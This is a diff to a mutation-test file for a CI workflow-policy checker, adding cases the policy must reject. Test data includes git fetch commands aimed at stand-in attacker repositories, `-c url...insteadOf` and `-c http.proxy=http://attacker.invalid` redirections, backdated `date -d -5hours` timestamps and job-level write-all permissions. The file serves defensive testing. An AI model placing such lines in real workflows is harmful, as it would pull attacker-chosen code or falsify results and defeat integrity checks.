@@ -253,16 +253,29 @@ const ACCEPTED_FORMS = {
     ENV_LINE,
     '        run: echo "VITEST_RUN_START=$(/usr/bin/date +%s%3N)" >> "$GITHUB_ENV"\n',
   ],
-  // And the one this rule deliberately does NOT catch, recorded on the
-  // accepting side so the boundary is written down rather than assumed:
-  // `date --date=@…` reads a clock and prints a constant. The policy cannot
-  // tell those apart without evaluating the shell; `report-file.mjs` refuses
-  // the value at runtime because it is not within a day of now. Two halves,
-  // and this is the seam between them.
-  'the run-start timestamp from a `date` told which date to print': [
+  // ── THE BOUNDARY THAT MOVED (#40 round 7) ────────────────────────────────
+  // This slot used to hold `$(date --date=@1748736000 +%s%3N)`, recorded on the
+  // *accepting* side as a stated seam: the policy could not tell a clock told
+  // what to print from a clock, and `report-file.mjs` would refuse the value at
+  // runtime because it is not within a day of now. That argument holds for a
+  // literal and fails for the spelling somebody would actually write —
+  // `$(date -d -5hours +%s%3N)` is within a day of now on every run, for ever,
+  // and it backdates the recorded start past a leftover report's mtime. So the
+  // seam moved: the whole `date` argv is an allowlist now, and the three
+  // backdating spellings are mutations below. Backticks stay on this side —
+  // they are the older spelling of the same substitution and refusing them
+  // would be a false red.
+  'the run-start timestamp read through a backtick substitution': [
     ENV_LINE,
-    '        run: echo "VITEST_RUN_START=$(date --date=@1748736000 +%s%3N)" >> "$GITHUB_ENV"\n',
+    '        run: echo "VITEST_RUN_START=`date +%s%3N`" >> "$GITHUB_ENV"\n',
   ],
+  // The separate spelling of a flag value, which the option table now *consumes*
+  // rather than ignoring. It is here because consuming it is what stops the
+  // operand scan reading `1` as the remote — a fix that made this form illegal
+  // would have been the false red that gets a rule deleted.
+  'the baseline fetch with its depth given as a separate word': rewritesFetch(
+    'git fetch --no-tags --depth 1 origin +refs/heads/main:refs/remotes/origin/main',
+  ),
   // A package.json script is still one behind a launcher: `sudo` is not what
   // makes `pnpm lint` a lint, so the rule asks what was unwrapped, not argv[0].
   'the linter behind a launcher': [LINT_RUN, '        run: timeout 300 pnpm lint\n'],
@@ -2349,6 +2362,200 @@ const MUTATIONS = [
     also: ['required-step-prerequisites'],
   },
 
+  // ---- least privilege, at the level where the asking happens (#40 round 7) --
+  // `least-privilege` read `workflow.permissions.contents === 'read'` and
+  // stopped. A job-level `permissions:` block *replaces* the workflow default
+  // rather than narrowing it, so all three of these were clean against the
+  // engine as committed: `node scripts/ci/workflow-policy.mjs .github/workflows`
+  // exited 0 and all 182 mutations of the day still passed. The rule's own
+  // sentence — "so a job inherits nothing it did not ask for" — was unenforced
+  // at exactly the level where a job asks.
+  {
+    name: 'the deploy job voting itself write access to the repository and its registry',
+    rule: 'least-privilege',
+    mutate: (s) =>
+      replaceOnce(
+        s,
+        '  deploy:\n    name: the deployment serves (not the product works)\n',
+        '  deploy:\n    name: the deployment serves (not the product works)\n    permissions:\n      contents: write\n      packages: write\n',
+      ),
+    message: /job `deploy` declares `permissions:` that grants `contents: write`/,
+  },
+  {
+    name: 'the same in the string form, which cannot be narrowed at all',
+    rule: 'least-privilege',
+    mutate: (s) =>
+      replaceOnce(
+        s,
+        '  deploy:\n    name: the deployment serves (not the product works)\n',
+        '  deploy:\n    name: the deployment serves (not the product works)\n    permissions: write-all\n',
+      ),
+    message:
+      /job `deploy` declares `permissions:` that is the string form `permissions: write-all`/,
+  },
+  {
+    name: 'a read scope nobody reads, added beside the workflow default',
+    rule: 'least-privilege',
+    // The allowlist from the other direction: `packages: read` is not a write
+    // and is still refused, because `contents` is the only scope this workflow
+    // reads and a list of scopes somebody judged dangerous is complete until the
+    // next release note.
+    mutate: (s) =>
+      replaceOnce(
+        s,
+        'permissions:\n  contents: read',
+        'permissions:\n  contents: read\n  packages: write',
+      ),
+    message: /workflow-level `permissions:` grants `packages: write`/,
+  },
+
+  // ---- the fetch's source, not only its destination (#40 round 7) -----------
+  // Round 6 pinned the refspec and never looked at the remote. `git fetch`'s
+  // operands are `<remote> <refspec>…`, and all four of these were clean against
+  // the engine as committed — the first two measured directly, the policy
+  // reporting `.github/workflows/ci.yml clean.` and exiting 0.
+  {
+    name: 'the baseline fetched from somebody else’s repository into the ref the ratchet reads',
+    rule: 'required-step-prerequisites',
+    // `origin/main` resolves afterwards, so `assert-floor-ratchet.mjs`'s "fatal
+    // on an unresolvable ref" check is satisfied — by a tree of the author's
+    // choosing, which every floor in the pull request is then compared against.
+    mutate: (s) =>
+      rewriteFetch(s, [
+        'git fetch --no-tags --depth=1 https://github.com/attacker/atrium +refs/heads/main:refs/remotes/origin/main',
+      ]),
+    pair: PAIRS.ratchetNeedsFetch,
+  },
+  {
+    name: 'the same remote reached over ssh, where the URL does not look like one',
+    rule: 'required-step-prerequisites',
+    mutate: (s) =>
+      rewriteFetch(s, [
+        'git fetch --no-tags --depth=1 git@github.com:attacker/atrium +refs/heads/main:refs/remotes/origin/main',
+      ]),
+    pair: PAIRS.ratchetNeedsFetch,
+  },
+  {
+    name: 'the remote left alone and rewritten underneath: `git -c url.<attacker>.insteadOf=…`',
+    rule: 'required-step-prerequisites',
+    // The blocking finding of this round, and the reviewer's sentence for it:
+    // "that is the value-vs-presence defect reproduced inside your fix for the
+    // value-vs-presence defect". `-c` was on the flag list by name, with the
+    // file's own comment saying its value "is a bare word and is not checked,
+    // because it is data" — so `origin` is named, the refspec is exact, every
+    // flag is allowed, and git rewrites the URL before it connects.
+    mutate: (s) =>
+      rewriteFetch(s, [
+        'git -c url.https://github.com/attacker/.insteadOf=https://github.com/lmvdz/ fetch --no-tags --depth=1 origin +refs/heads/main:refs/remotes/origin/main',
+      ]),
+    pair: PAIRS.ratchetNeedsFetch,
+  },
+  {
+    name: 'a different transport knob through the same flag: `-c http.proxy=…`',
+    rule: 'required-step-prerequisites',
+    // Here so the entry is an allowlist of *values* rather than a refusal of the
+    // one spelling above. `protocol.version=<n>` is the only assignment argued
+    // for; `http.proxy`, `core.gitProxy`, `remote.origin.url` and the next one
+    // are refused without this file having heard of them.
+    mutate: (s) =>
+      rewriteFetch(s, [
+        'git -c http.proxy=http://attacker.invalid:8080 fetch --no-tags --depth=1 origin +refs/heads/main:refs/remotes/origin/main',
+      ]),
+    pair: PAIRS.ratchetNeedsFetch,
+  },
+
+  // ---- a clock that can be told what time it is (#40 round 7) ---------------
+  // Round 6 required the value to come from a command called `date` and wrote
+  // the rest down as a stated boundary. All three of these were clean against
+  // that engine, and the first is the one that matters: a *relative* offset is
+  // within a day of now on every run, so `report-file.mjs`'s plausibility window
+  // admits it and its 6h `MAX_RUN_AGE_MS` admits it, while a report written two
+  // hours before the suite started now post-dates the recorded start. The honest
+  // value reports "is stale: last written 7200s before vitest started"; the
+  // backdated one reports no problems at all.
+  {
+    name: 'the run-start timestamp backdated five hours with `date -d`',
+    rule: 'required-step-prerequisites',
+    mutate: (s) =>
+      replaceOnce(
+        s,
+        ENV_LINE,
+        '        run: echo "VITEST_RUN_START=$(date -d -5hours +%s%3N)" >> "$GITHUB_ENV"\n',
+      ),
+    pair: PAIRS.suiteNeedsReset,
+  },
+  {
+    name: 'the same for the e2e suite, spelled `--date`',
+    rule: 'required-step-prerequisites',
+    mutate: (s) =>
+      replaceOnce(
+        s,
+        '        run: echo "E2E_RUN_START=$(date +%s%3N)" >> "$GITHUB_ENV"\n',
+        '        run: echo "E2E_RUN_START=$(date --date=-5hours +%s%3N)" >> "$GITHUB_ENV"\n',
+      ),
+    pair: PAIRS.e2eSuiteNeedsReset,
+  },
+  {
+    name: 'the absolute form this file used to accept: `date --date=@1748736000`',
+    rule: 'required-step-prerequisites',
+    // Moved here from ACCEPTED_FORMS, where it sat as a written-down seam
+    // between the policy half and the runtime half. The seam was in the wrong
+    // place: the argument that a literal stops working a day after it is written
+    // is true of the literal and says nothing about `-d -5hours` beside it.
+    mutate: (s) =>
+      replaceOnce(
+        s,
+        ENV_LINE,
+        '        run: echo "VITEST_RUN_START=$(date --date=@1748736000 +%s%3N)" >> "$GITHUB_ENV"\n',
+      ),
+    pair: PAIRS.suiteNeedsReset,
+  },
+
+  // ---- the linter's operand, unpinned since round 1 (#40 round 7) -----------
+  {
+    name: 'actionlint pointed at one workflow file, leaving every other one unlinted',
+    rule: 'policy-steps-present',
+    // Clean against the engine as committed. `actionlint` with no file operands
+    // lints every workflow in the repository; given one it lints exactly that
+    // one, so a `.github/workflows/x.yaml` added later goes unlinted with the
+    // step still present and still named. It is the same defect
+    // `CHECKS_ALL_WORKFLOWS` closed for this engine's own argument, in the step
+    // immediately above it — and until now it was caught only incidentally, by
+    // this file pinning that `run:` line verbatim, which is an alarm on one
+    // spelling rather than a rule.
+    mutate: (s) =>
+      replaceOnce(
+        s,
+        `        run: '"$RUNNER_TEMP/actionlint" -color'\n`,
+        `        run: '"$RUNNER_TEMP/actionlint" -color .github/workflows/ci.yml'\n`,
+      ),
+    message: /never runs actionlint/,
+  },
+
+  // ---- a number is present, a bound is not (#40 round 7) --------------------
+  {
+    name: 'a job bounded at three days, which is GitHub’s maximum and nobody’s deadline',
+    rule: 'job-timeout-required',
+    mutate: (s) =>
+      replaceOnce(
+        s,
+        '    runs-on: ubuntu-latest\n    timeout-minutes: 20\n',
+        '    runs-on: ubuntu-latest\n    timeout-minutes: 4320\n',
+      ),
+    message: /job `verify` declares `timeout-minutes: 4320`/,
+  },
+  {
+    name: 'the other end of the same missing bound: `timeout-minutes: 0`',
+    rule: 'job-timeout-required',
+    mutate: (s) =>
+      replaceOnce(
+        s,
+        '    runs-on: ubuntu-latest\n    timeout-minutes: 20\n',
+        '    runs-on: ubuntu-latest\n    timeout-minutes: 0\n',
+      ),
+    message: /job `verify` declares `timeout-minutes: 0`/,
+  },
+
   // Every entry in REJECTED_FORMS, as a mutation of the baseline fetch step.
   // The step stays present and named; only the shape of what it runs changes.
   ...Object.entries(REJECTED_FORMS).map(([name, lines]) => ({
@@ -2399,10 +2606,15 @@ function main() {
   const pristine = readFileSync(WORKFLOW, 'utf8');
   const failures = [];
 
-  const clean = checkWorkflowFile(pristine, WORKFLOW);
-  if (clean.length > 0) {
+  // Drained rather than counted-then-branched (#40 round 7). `checkerGraphProblems`
+  // asks who *asserts* on each check now, not who calls it — a blind critic
+  // stripped four `expect(…)` wrappers from packages/ci-guard while keeping every
+  // call and the whole main-module rule vanished with every count still true. A
+  // result collected into a variable and then read by an `if` is a call whose
+  // answer this file might or might not be using; a drain is one that it is.
+  for (const violation of checkWorkflowFile(pristine, WORKFLOW)) {
     failures.push(
-      `the unmutated ${WORKFLOW} must pass its own policy, but reported: ${clean.map((v) => `[${v.rule}] ${v.message}`).join(' | ')}`,
+      `the unmutated ${WORKFLOW} must pass its own policy, but reported: [${violation.rule}] ${violation.message}`,
     );
   }
 
@@ -2428,9 +2640,9 @@ function main() {
   // it. The real set must be clean first: a check that fires on everything
   // proves nothing by firing on a gutted set too.
   const jobs = parse(pristine)?.jobs ?? {};
-  if (protectedCommandCoverage(jobs).length > 0) {
+  for (const gap of protectedCommandCoverage(jobs)) {
     failures.push(
-      `protectedCommandCoverage reports problems against the real ${WORKFLOW} and the real PROTECTED_COMMANDS: ${protectedCommandCoverage(jobs).join(' | ')}`,
+      `protectedCommandCoverage reports a problem against the real ${WORKFLOW} and the real PROTECTED_COMMANDS: ${gap}`,
     );
   }
   for (const mutation of ENGINE_MUTATIONS) {
